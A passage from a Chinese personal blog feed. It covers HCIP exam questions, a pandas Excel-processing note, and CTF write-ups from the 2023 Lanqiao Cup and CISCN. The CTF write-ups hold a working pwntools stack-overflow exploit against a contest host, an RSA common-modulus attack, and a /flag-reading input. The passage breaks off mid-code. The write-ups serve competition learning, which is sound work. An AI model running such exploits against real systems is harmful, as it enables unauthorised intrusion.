如图所示，CE1通过BGP将192.168.1.0/24通告给PE1和PE2，P1分别和PE1/PE2/PE3建立VPNv4邻居关系，且P1是RR.在PE1/PE2/PE3设备上创建相同的VPN实例oa，RD为1：1，RT为10：10，其它参数为默认值。当PE3向PE1发送目的地址为192.168.1.0/24的数据包时需要携带两层标签，请将内外层标签的数值进行匹配</strong></p><p><img src="http://www.ibossay.com/data/upload/2023/0711/10/64acbd6274ad7/word/media/image107.png"></p><p><img src="http://www.ibossay.com/data/upload/2023/0711/10/64acbd6274ad7/word/media/image108.png"></p><p><strong>20 如图所示，CE1通过BGP将192.168.1.0/24通告给PE1和PE2，P1分别和PE1/PE2/PE3建立VPNv4邻居关系，且P1是RR.在PE1/PE2/PE3设备上创建相同的VPN实例oa，RD为1：1，RT为10：10，其它参数为默认值。当PE3向PE1发送目的地址为192.168.1.0/24的数据包时需要携带两层标签，请将内外层标签的数值进行匹配。(  )</strong>  </p><p><img src="http://www.ibossay.com/data/upload/2023/0711/10/64acbd6274ad7/word/media/image116.png"></p><p><img src="http://www.ibossay.com/data/upload/2023/0711/10/64acbd6274ad7/word/media/image117.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;H12-831新题库连线题汇总&quot;&gt;&lt;a href=&quot;#H12-831新题库连线题汇总&quot; class=&quot;headerlink&quot; title=&quot;H12-831新题库连线题汇总&quot;&gt;&lt;/a&gt;H12-831新题库连线题汇总&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;2 如图所示,有一个</summary>
      
    
    
    
    <category term="HCIP" scheme="https://shierjinghuang.github.io/categories/HCIP/"/>
    
    
    <category term="HCIP" scheme="https://shierjinghuang.github.io/tags/HCIP/"/>
    
    <category term="网络工程" scheme="https://shierjinghuang.github.io/tags/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>Python Excel数据简单处理记录</title>
    <link href="https://shierjinghuang.github.io/2023/07/07/Python%20Excel%E5%A4%84%E7%90%86%E8%AE%B0%E5%BD%95/"/>
    <id>https://shierjinghuang.github.io/2023/07/07/Python%20Excel%E5%A4%84%E7%90%86%E8%AE%B0%E5%BD%95/</id>
    <published>2023-07-07T03:21:52.000Z</published>
    <updated>2023-07-07T04:19:03.153Z</updated>
    
    <content type="html"><![CDATA[<h2><center>Python Excel数据简单处理记录</center></h2><p>正在备研的大三把不少东西忘的一干二净的我，花了两个小时对Python的pandas库进行复健最后实现老师那边提出的要求，这里是一些记录</p><p>要提取<strong>Excel</strong>文件中的行，可以使用<strong>pandas</strong>库对数据进行处理</p><ul><li>直接通过pandas库获取数据</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd<span class="token comment"># 读取Excel文件</span>df <span class="token operator">=</span> pd<span class="token punctuation">.</span>read_excel<span class="token punctuation">(</span><span class="token string">'XXXX.xls'</span><span class="token punctuation">)</span><span class="token comment"># 打印表格数据</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">)</span><span class="token comment"># 提取特定列的数据</span>column_data <span class="token operator">=</span> df<span class="token punctuation">[</span><span class="token string">'题目'</span><span class="token punctuation">]</span><span class="token comment"># 提取特定行的数据</span>row_data <span class="token operator">=</span> df<span class="token punctuation">.</span>loc<span class="token punctuation">[</span>row_index<span class="token punctuation">]</span><span class="token comment"># 遍历所有行</span><span class="token keyword">for</span> index<span class="token punctuation">,</span> row <span class="token keyword">in</span> df<span class="token punctuation">.</span>iterrows<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 处理每一行的数据</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>row<span class="token punctuation">[</span><span class="token string">'题目'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>emmm…..直接提出出来的文件实际上是只有题目这一列的内容脚本需要进一步更改</p><blockquote><p> 注意：如果整行数据，使用<code>row.values</code>输出整行数据，其中<code>row.values</code>是包含该行数据的NumPy数组 </p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd<span class="token keyword">import</span> re<span class="token comment"># 读取Excel文件</span>df <span class="token operator">=</span> pd<span class="token punctuation">.</span>read_excel<span class="token punctuation">(</span><span class="token string">'path_to_excel_file.xls'</span><span class="token punctuation">)</span><span class="token comment"># 遍历所有行</span><span class="token keyword">for</span> index<span class="token punctuation">,</span> row <span class="token keyword">in</span> df<span class="token punctuation">.</span>iterrows<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 提取当前行的数据</span>    row_data <span class="token operator">=</span> row    <span class="token comment"># 输出整行数据</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Row"</span><span class="token punctuation">,</span> index<span class="token punctuation">)</span>    <span class="token keyword">for</span> column_name<span class="token punctuation">,</span> value <span class="token keyword">in</span> row_data<span class="token punctuation">.</span>iteritems<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 输出每一列的数据</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>column_name<span class="token punctuation">,</span> <span class="token string">":"</span><span class="token punctuation">,</span> value<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>为实现可读性的要求，简单对代码进行处理将其存放在txt文档里,完整代码如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd<span class="token keyword">import</span> re<span class="token comment"># 读取Excel文件</span>df <span class="token operator">=</span> pd<span class="token punctuation">.</span>read_excel<span class="token punctuation">(</span><span class="token string">'test_question_831.xls'</span><span class="token punctuation">)</span><span class="token comment"># 获取有效列名列表</span>column_names <span class="token operator">=</span> df<span class="token punctuation">.</span>columns<span class="token punctuation">.</span>tolist<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 打印有效列名</span><span class="token keyword">print</span><span class="token punctuation">(</span>column_names<span class="token punctuation">)</span><span class="token comment"># 打开文本文件以写入模式</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'output2.txt'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>    <span class="token comment"># 遍历所有行</span>    <span class="token keyword">for</span> index<span class="token punctuation">,</span> row <span class="token keyword">in</span> df<span class="token punctuation">.</span>iterrows<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># 提取当前行的数据</span>        row_data <span class="token operator">=</span> row        <span class="token comment"># 输出整行数据并写入文本文件</span>        <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Row </span><span class="token interpolation"><span class="token punctuation">&#123;</span>index<span class="token punctuation">&#125;</span></span><span class="token string">\n"</span></span><span class="token punctuation">)</span>        <span class="token keyword">for</span> column_name<span class="token punctuation">,</span> value <span class="token keyword">in</span> row_data<span class="token punctuation">.</span>iteritems<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment"># 如果列不为空，则输出列名和对应的值并写入文本文件</span>            <span class="token keyword">if</span> <span class="token keyword">not</span> pd<span class="token punctuation">.</span>isnull<span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">:</span>                line <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>column_name<span class="token punctuation">&#125;</span></span><span class="token string">: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>value<span class="token punctuation">&#125;</span></span><span class="token string">\n"</span></span>                <span class="token keyword">print</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span>                <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>line<span class="token punctuation">)</span>        <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后打开txt文件我就看到了那还有一大堆图片，貌似有一些标签写的还有问题…..</p><ul><li>将文件保存为html</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd<span class="token keyword">import</span> re<span class="token comment"># 读取Excel文件</span>df <span class="token operator">=</span> pd<span class="token punctuation">.</span>read_excel<span class="token punctuation">(</span><span class="token string">'test_question_831.xls'</span><span class="token punctuation">)</span><span class="token comment"># 获取有效列名列表</span>column_names <span class="token operator">=</span> df<span class="token punctuation">.</span>columns<span class="token punctuation">.</span>tolist<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 打印有效列名</span><span class="token keyword">print</span><span class="token punctuation">(</span>column_names<span class="token punctuation">)</span><span class="token comment"># 创建HTML字符串</span>html_content <span class="token operator">=</span> <span class="token string">"&lt;html>&lt;body>\n"</span><span class="token comment"># 遍历所有行</span><span class="token keyword">for</span> index<span class="token punctuation">,</span> row <span class="token keyword">in</span> df<span class="token punctuation">.</span>iterrows<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 提取当前行的数据</span>    row_data <span class="token operator">=</span> row    <span class="token comment"># 检查是否有非空列</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> row_data<span class="token punctuation">.</span>isnull<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">all</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># 输出整行数据到HTML字符串</span>        html_content <span class="token operator">+=</span> <span class="token string-interpolation"><span class="token string">f"&lt;p>Row </span><span class="token interpolation"><span class="token punctuation">&#123;</span>index<span class="token punctuation">&#125;</span></span><span class="token string">&lt;/p>\n"</span></span>        <span class="token keyword">for</span> column_name<span class="token punctuation">,</span> value <span class="token keyword">in</span> row_data<span class="token punctuation">.</span>iteritems<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment"># 如果列不为空，则输出列名和对应的值到HTML字符串</span>            <span class="token keyword">if</span> <span class="token keyword">not</span> pd<span class="token punctuation">.</span>isnull<span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">:</span>                html_content <span class="token operator">+=</span> <span class="token string-interpolation"><span class="token string">f"&lt;p></span><span class="token interpolation"><span class="token punctuation">&#123;</span>column_name<span class="token punctuation">&#125;</span></span><span class="token string">: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>value<span class="token punctuation">&#125;</span></span><span class="token string">&lt;/p>\n"</span></span>        html_content <span class="token operator">+=</span> <span class="token string">"&lt;br>\n"</span><span class="token comment"># 完成HTML字符串</span>html_content <span class="token operator">+=</span> <span class="token string">"&lt;/body>&lt;/html>"</span><span class="token comment"># 将HTML字符串写入HTML文件</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'output.html'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>    <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>html_content<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>HCIP怎么样先放一边，至少是Python复健了，下一步应该拿Python爬虫对老题库进行下爬取，把之前的题目删除，在看本次新增题目的覆盖率了</p><p>初略一看还行</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2&gt;&lt;center&gt;Python Excel数据简单处理记录&lt;/center&gt;&lt;/h2&gt;

&lt;p&gt;正在备研的大三把不少东西忘的一干二净的我，花了两个小时对Python的pandas库进行复健最后实现老师那边提出的要求，这里是一些记录&lt;/p&gt;
&lt;p&gt;要提取&lt;strong&gt;Exc</summary>
      
    
    
    
    <category term="个人" scheme="https://shierjinghuang.github.io/categories/%E4%B8%AA%E4%BA%BA/"/>
    
    
    <category term="Python" scheme="https://shierjinghuang.github.io/tags/Python/"/>
    
    <category term="pandas" scheme="https://shierjinghuang.github.io/tags/pandas/"/>
    
  </entry>
  
  <entry>
    <title>2023年蓝桥杯网络安全大赛</title>
    <link href="https://shierjinghuang.github.io/2023/06/09/%E8%93%9D%E6%A1%A5%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/"/>
    <id>https://shierjinghuang.github.io/2023/06/09/%E8%93%9D%E6%A1%A5%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/</id>
    <published>2023-06-09T03:21:52.000Z</published>
    <updated>2023-06-09T03:26:45.030Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2023年蓝桥杯网络安全大赛"><a href="#2023年蓝桥杯网络安全大赛" class="headerlink" title="2023年蓝桥杯网络安全大赛"></a>2023年蓝桥杯网络安全大赛</h1><p>[TOC]</p><h2 id="WP部分"><a href="#WP部分" class="headerlink" title="WP部分"></a>WP部分</h2><blockquote><p>怎么说呢因为蓝桥杯网络安全赛事的一些奇怪操作我没有报名，队内大佬参加并拿到了非常优秀的成绩，这是直接转的人家WP</p></blockquote><h3 id="情报收集"><a href="#情报收集" class="headerlink" title="情报收集"></a>情报收集</h3><h4 id="禁止访问"><a href="#禁止访问" class="headerlink" title="禁止访问"></a>禁止访问</h4><p>根据源代码提示，HackBar直接修改请求头Client-IP： </p><img src="D:\blog\shierjinghuang\source\_posts\蓝桥杯网络安全大赛\禁止访问.png" style="zoom: 33%;" /><h3 id="数据分析"><a href="#数据分析" class="headerlink" title="数据分析"></a>数据分析</h3><h4 id="ZIP"><a href="#ZIP" class="headerlink" title="ZIP"></a>ZIP</h4><p>WireShark找到flag.zip： </p><img src="D:\blog\shierjinghuang\source\_posts\蓝桥杯网络安全大赛\流量分析.png" style="zoom:50%;" /><p>发现需要解压密码，压缩包备注里告诉了密码的格式。使用ARCHPR破解： </p><img src="D:\blog\shierjinghuang\source\_posts\蓝桥杯网络安全大赛\压缩包密码爆破.png" style="zoom:50%;" /><h3 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h3><h4 id="CyberChef"><a href="#CyberChef" class="headerlink" title="CyberChef"></a>CyberChef</h4><p>到Cyberchef，先ROT13（好像就是凯撒密码，解密时Amount需要调整），然后解Base64：</p><p><img src="D:\blog\shierjinghuang\source_posts\蓝桥杯网络安全大赛\CyberChef.png"></p><h4 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h4><p>RSA共模攻击：</p><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">from Crypto.Util.number import *import gmpy2import randomrandom.seed(123456)e1 &#x3D; random.randint(100000000, 999999999)e2 &#x3D; 65537n &#x3D;7265521127830448713067411832186939510560957540642195787738901620268897564963900603849624938868472135068795683478994264434459545615489055678687748127470957m1 &#x3D;3315026215410356401822612597933850774333471554653501609476726308255829187036771889305156951657972976515685121382853979526632479380900600042319433533497363m2 &#x3D;1188105647021006315444157379624581671965264301631019818847700108837497109352704297426176854648450245702004723738154094931880004264638539450721642553435120gcd, s, t &#x3D; gmpy2.gcdext(e1, e2)if s &lt; 0:s &#x3D; -sm1 &#x3D; gmpy2.invert(m1, n)if t &lt; 0:t &#x3D; -tm2 &#x3D; gmpy2.invert(m2, n)m1 &#x3D; gmpy2.powmod(m1, s, n)m2 &#x3D; gmpy2.powmod(m2, t, n)m &#x3D; m1 * m2 % nflag &#x3D; long_to_bytes(m)print(flag)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h3><h4 id="RC4"><a href="#RC4" class="headerlink" title="RC4"></a>RC4</h4><p>直接IDA动态调试，在main函数return时，可以看到原来变量v5的内容经过RC4被改成了flag： </p><p><img src="D:\blog\shierjinghuang\source_posts\蓝桥杯网络安全大赛\RC4.png"></p><h4 id="XOR"><a href="#XOR" class="headerlink" title="XOR"></a>XOR</h4><p>程序将明文和key进行异或，我们直接将密文再异或一次就得到flag。 </p><p><img src="D:\blog\shierjinghuang\source_posts\蓝桥杯网络安全大赛\XOR.png"></p><p>exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">key <span class="token operator">=</span> <span class="token string">'SEcRET7'</span>enc <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x35</span><span class="token punctuation">,</span> <span class="token number">0x29</span><span class="token punctuation">,</span> <span class="token number">0x02</span><span class="token punctuation">,</span> <span class="token number">0x35</span><span class="token punctuation">,</span> <span class="token number">0x3E</span><span class="token punctuation">,</span> <span class="token number">0x35</span><span class="token punctuation">,</span> <span class="token number">0x0F</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0x06</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0x26</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x1A</span><span class="token punctuation">,</span> <span class="token number">0x61</span><span class="token punctuation">,</span> <span class="token number">0x77</span><span class="token punctuation">,</span><span class="token number">0x5A</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0x4E</span><span class="token punctuation">,</span><span class="token number">0x6B</span><span class="token punctuation">,</span> <span class="token number">0x21</span><span class="token punctuation">,</span> <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x7E</span><span class="token punctuation">,</span> <span class="token number">0x71</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span><span class="token number">0x75</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0x73</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x21</span><span class="token punctuation">,</span><span class="token number">0x61</span><span class="token punctuation">,</span> <span class="token number">0x4A</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>enc<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">for</span> x <span class="token keyword">in</span> enc<span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="漏洞挖掘分析"><a href="#漏洞挖掘分析" class="headerlink" title="漏洞挖掘分析"></a>漏洞挖掘分析</h3><h4 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h4><p>gets函数栈溢出漏洞，直接修改返回地址为后门函数即可： </p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">,</span> os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span> log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token punctuation">)</span><span class="token comment"># p = process('./pwn')</span><span class="token comment"># libc = ELF('../../glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/libc.so.6')</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'101.200.77.68'</span><span class="token punctuation">,</span> <span class="token string">'12451'</span><span class="token punctuation">)</span><span class="token comment"># libc = ELF('./libc-2.27.so')</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span>se <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span>sa <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>sl <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>data<span class="token punctuation">)</span>sla <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>rc <span class="token operator">=</span> <span class="token keyword">lambda</span> num <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>num<span class="token punctuation">)</span>rl <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>ru <span class="token operator">=</span> <span class="token keyword">lambda</span> delims <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>delims<span class="token punctuation">)</span>uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>info <span class="token operator">=</span> <span class="token keyword">lambda</span> tag<span class="token punctuation">,</span> addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>tag <span class="token operator">+</span> <span class="token string">" -> "</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>ia <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>backdoor <span class="token operator">=</span> <span class="token number">0x4011B1</span>payload <span class="token operator">=</span> <span class="token string">b'B'</span> <span class="token operator">*</span> <span class="token number">0x20</span> <span class="token operator">+</span> <span class="token string">b'deadbeef'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>backdoor<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>ia<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="杂谈："><a href="#杂谈：" class="headerlink" title="杂谈："></a>杂谈：</h2><blockquote><p>以下为个人观点</p></blockquote><p>今年的蓝桥杯可以说是破事一堆，作为网安这边第一个交钱比赛的赛事，第一个双机位监考同时设有监考老师，禁止查外网，甚至禁止pip的比赛，今年的蓝桥杯网安都有开创性的意义</p><p>如果我没记错的话，第一次定的时间是5月27-28，然后果不其然跟CISCN撞了，之后改时间啥啥的作为一个看乐子的人倒是看了个尽兴，同时今年一些高校，在与蓝桥杯合作的高校在没有接触过CTF的同学们中宣传本届蓝桥杯网络安全大赛…….</p><p>最后的结果已经是省赛能做一道题就能稳定三等奖了，团队中全栈大佬甚至在比赛中短暂登顶初赛第一，最后前五十，因为蓝桥杯在算法那边的名声在外还真有一些没接触过CTF的兄弟报名了蓝桥杯网络安全大赛，最后0解饮恨</p><p>只能说不好评价也不想评级，蓝桥杯赛事主办方你开心就好</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2023年蓝桥杯网络安全大赛&quot;&gt;&lt;a href=&quot;#2023年蓝桥杯网络安全大赛&quot; class=&quot;headerlink&quot; title=&quot;2023年蓝桥杯网络安全大赛&quot;&gt;&lt;/a&gt;2023年蓝桥杯网络安全大赛&lt;/h1&gt;&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h2 id=&quot;WP部分</summary>
      
    
    
    
    <category term="CTF" scheme="https://shierjinghuang.github.io/categories/CTF/"/>
    
    
    <category term="蓝桥杯" scheme="https://shierjinghuang.github.io/tags/%E8%93%9D%E6%A1%A5%E6%9D%AF/"/>
    
    <category term="CTF" scheme="https://shierjinghuang.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2023年ciscn题解</title>
    <link href="https://shierjinghuang.github.io/2023/05/27/2023%E5%B9%B4ciscn%E9%A2%98%E8%A7%A3/"/>
    <id>https://shierjinghuang.github.io/2023/05/27/2023%E5%B9%B4ciscn%E9%A2%98%E8%A7%A3/</id>
    <published>2023-05-27T11:56:52.000Z</published>
    <updated>2023-05-30T06:41:14.403Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DebuGGerrr-战队WRITEUP"><a href="#DebuGGerrr-战队WRITEUP" class="headerlink" title="DebuGGerrr 战队WRITEUP"></a>DebuGGerrr 战队WRITEUP</h1><h2 id="一、战队信息"><a href="#一、战队信息" class="headerlink" title="一、战队信息"></a>一、战队信息</h2><p>战队名称： DebuGGerrr </p><p>战队排名：261</p><h2 id="二、解题情况"><a href="#二、解题情况" class="headerlink" title="二、解题情况"></a>二、解题情况</h2><p> <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230528173741.png">  </p><p>[TOC]</p><h2 id="三、解题过程"><a href="#三、解题过程" class="headerlink" title="三、解题过程"></a>三、解题过程</h2><h3 id="杂项："><a href="#杂项：" class="headerlink" title="杂项："></a>杂项：</h3><h4 id="签到卡："><a href="#签到卡：" class="headerlink" title="签到卡："></a>签到卡：</h4><p> 随便输入得到hint，关注公众号，得到他的提示，输入 print(open(‘/flag’).read())得到flag</p><h4 id="国粹："><a href="#国粹：" class="headerlink" title="国粹："></a>国粹：</h4><p>在最初的思路里是一位题目是一个形如E(x)=(ax+b)(modm)的类仿射密码</p><p>后面试着要不把这些画出来看下，在写了几串之后看到了flag….然后因为分工，两个人写点坐标的格式不一样，最终Python代码如下…..</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd<span class="token comment">#读入文件</span>file_path <span class="token operator">=</span> <span class="token string">"data.txt"</span>df <span class="token operator">=</span> pd<span class="token punctuation">.</span>read_table<span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> header<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token comment">#定义 x  y变量</span>x <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>y <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token 